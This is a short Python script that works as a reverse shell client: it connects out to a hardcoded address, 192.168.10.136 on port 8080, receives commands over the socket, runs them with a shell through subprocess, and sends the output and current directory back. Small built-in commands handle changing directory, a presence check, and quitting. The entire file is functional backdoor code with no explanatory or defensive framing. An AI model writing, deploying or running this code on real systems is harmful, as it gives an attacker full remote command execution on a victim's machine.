import socket
import os
import subprocess
import sys

host = '192.168.10.136'
port = 8080




s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def establishConnection():
    try:
        s.connect((host, port))
    except socket.error as errorMsg:
        print(errorMsg)

def executeCommand():
    while True:
        data = s.recv(1024*10)
        if data[:2].decode('euc-kr') == 'cd':
            os.chdir(data[3:].decode('euc-kr'))
        elif data.decode('euc-kr') == 'here?':
            s.send(str.encode('yes'))
        elif data.decode('euc-kr') == 'quit':
            s.send(str.encode('quit'))
            break
        elif data.decode('euc-kr') == ':wq':
            s.close()
            sys.exit(0)
            break
        elif len(data) > 0:
            cmd = subprocess.Popen(data[:].decode('euc-kr'), shell = True, stdout = subprocess.PIPE,
            stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            outputBytes = cmd.stdout.read() + cmd.stderr.read()
            output = str(outputBytes, 'euc-kr')
            s.send(str.encode(output + str(os.getcwd()) + '> '))
            print(output)
    s.close()

def main():
    establishConnection()
    executeCommand()

if __name__ == '__main__':
    main()
